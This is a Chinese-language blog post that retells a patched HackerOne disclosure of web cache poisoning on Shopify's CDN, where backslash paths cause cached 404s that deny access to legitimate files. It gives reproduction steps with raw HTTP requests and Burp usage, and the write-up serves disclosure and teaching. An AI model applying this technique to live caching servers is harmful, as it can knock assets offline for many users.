#  【$3,800】Shopify 缓存中毒导致DoS漏洞披露   
原创 骨哥说事  骨哥说事   2025-06-06 02:58  
  
<table><tbody><tr><td data-colwidth="557" width="557" valign="top" style="word-break: break-all;"><h1 data-selectable-paragraph="" style="white-space: normal;outline: 0px;max-width: 100%;font-family: -apple-system, system-ui, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;letter-spacing: 0.544px;background-color: rgb(255, 255, 255);box-sizing: border-box !important;overflow-wrap: break-word !important;"><strong style="outline: 0px;max-width: 100%;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="color: rgb(255, 0, 0);"><strong><span style="font-size: 15px;"><span leaf="">声明：</span></span></strong></span><span style="font-size: 15px;"></span></span></strong><span style="outline: 0px;max-width: 100%;font-size: 18px;box-sizing: border-box !important;overflow-wrap: break-word !important;"><span style="font-size: 15px;"><span leaf="">文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。</span></span></span></h1></td></tr></tbody></table>#   
  
#   
  
****# 防走失：https://gugesay.com/archives/4425  
  
******不想错过任何消息？设置星标****↓ ↓ ↓**  
****  
#   
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jlbXyV4tJfwXpicwdZ2gTB6XtwoqRvbaCy3UgU1Upgn094oibelRBGyMs5GgicFKNkW1f62QPCwGwKxA/640?wx_fmt=png&from=appmsg "")  
  
# 概要  
  
白帽子在 Shopify 的 CDN 域名上发现了一处 Web 缓存投毒漏洞，其中缓存服务器将反斜杠和正斜杠视为等效，而源服务器对包含反斜杠的路径返回 404 错误。  
  
这种差异允许攻击者使用反斜杠而不是正斜杠发送请求，导致 404 错误被缓存并用于合法请求，从而创建了一个可能导致多个 Shopify 服务受影响的拒绝服务条件。该漏洞通过在所有受影响的 CDN 域名上实施一致的路径处理得到了修复。  
# 复现步骤  
1. 打开 cdn.shopify.com 上托管的任意文件（例如：https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js  
），并使用 Burp Suite 拦截该请求：  
  
```
GET /static/javascripts/vendor/bugsnag.v7.4.0.min.js HTTP/1.1Host: cdn.shopify.comConnection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9
```  
1. 为了使该请求返回 404 错误，首先将 URL 中的斜杠替换为反斜杠  
  
1. 在进行任何测试之前，须在 URL 末尾添加一个缓存破坏器查询参数，以防止对使用该网站的所有用户造成拒绝服务攻击。（例如，在 URL 末尾添加?cachebuster={随机值}  
）,新的请求如下：  
  
```
GET /static\javascripts\vendor\bugsnag.v7.4.0.min.js?cachebuster=123 HTTP/1.1Host: cdn.shopify.comConnection: closeUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: en-US,en;q=0.9
```  
1. 发送此之前的请求将返回 404，并且将具有与 https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js?cachebuster=123  
 相同的缓存键  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jluy3mGFxHnbjiaOAO0WUcpS6o78LIVOhw4fJY9iaRbjz1k9BZMk9LwYseiaF1eK2pejk7KsYEsOXwzg/640?wx_fmt=png&from=appmsg "")  
  
1. 为了缓存该响应，需要在 Burp Repeater 中多次发送损坏请求，或者使用 Burp Intruder 来持续缓存错误页面  
  
1. 现在，尝试在浏览器中打开 https://cdn.shopify.com/static/javascripts/vendor/bugsnag.v7.4.0.min.js?cachebuster=123  
，将显示为 404 错误页面，而不是 javascript 文件  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jluy3mGFxHnbjiaOAO0WUcpSGYOicZAP3N7nlW8epjmtHJufhkJYJjHXYTBOxj3CuiakoaGkiaoQXjsJQ/640?wx_fmt=png&from=appmsg "")  
  
  
同样的漏洞也适用于 shopify-assets.shopifycdn.com，该域名会被其他 Shopify 网站如 accounts.shopify.com 使用。  
# 赏金结算  
  
![file](https://mmbiz.qpic.cn/sz_mmbiz_png/hZj512NN8jluy3mGFxHnbjiaOAO0WUcpSxpaLnTnD8kmBKSrzYSU4dZfRuDWNYb07lKmoYq04icEIMx693uNHibVQ/640?wx_fmt=png&from=appmsg "")  
  
报告原文：https://hackerone.com/reports/1695604  
  
- END -  
  
**加入星球，随时交流：**  
  
**********（会员统一定价）：128元/年（0.35元/天）******  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hZj512NN8jnMJtHJnShkTnh3vR3fmaqicPicANic6OEsobrpRjx5vG6mMTib1icuPmuG74h2bxC4eP6nMMzbs5QaSlw/640?wx_fmt=jpeg&from=appmsg "")  
  
**感谢阅读，如果觉得还不错的话，欢迎分享给更多喜爱的朋友～**  
  
